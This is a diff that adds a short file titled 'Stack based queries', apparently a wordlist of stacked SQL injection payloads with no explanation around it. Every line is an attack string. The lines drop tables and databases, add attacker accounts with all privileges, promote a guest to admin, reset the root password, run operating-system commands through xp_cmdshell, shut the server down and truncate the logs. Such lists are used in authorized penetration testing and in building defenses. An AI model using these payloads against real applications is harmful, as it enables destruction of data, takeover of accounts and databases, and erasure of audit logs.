@@ -1,0 +1,22 @@
+Stack based queries :~
+
+'; DROP TABLE users--
+'; CREATE TABLE test(id int)--
+'; INSERT INTO users(username,password) VALUES('hacker','pass')--
+'; UPDATE users SET role='admin' WHERE username='guest'--
+'; DELETE FROM users WHERE id=1--
+'; EXEC xp_cmdshell('dir')--
+'; SHUTDOWN--
+'; CREATE USER attacker IDENTIFIED BY pass--
+'; GRANT ALL PRIVILEGES ON *.* TO attacker--
+'; ALTER USER root WITH PASSWORD 'root'--
+'; CREATE DATABASE hacked--
+'; USE hacked--
+'; SELECT * FROM users--
+'; CREATE TABLE injected(data text)--
+'; INSERT INTO injected VALUES('payload')--
+'; DROP DATABASE test--
+'; RENAME TABLE users TO users_backup--
+'; TRUNCATE TABLE logs--
+'; COMMIT--
+'; ROLLBACK--
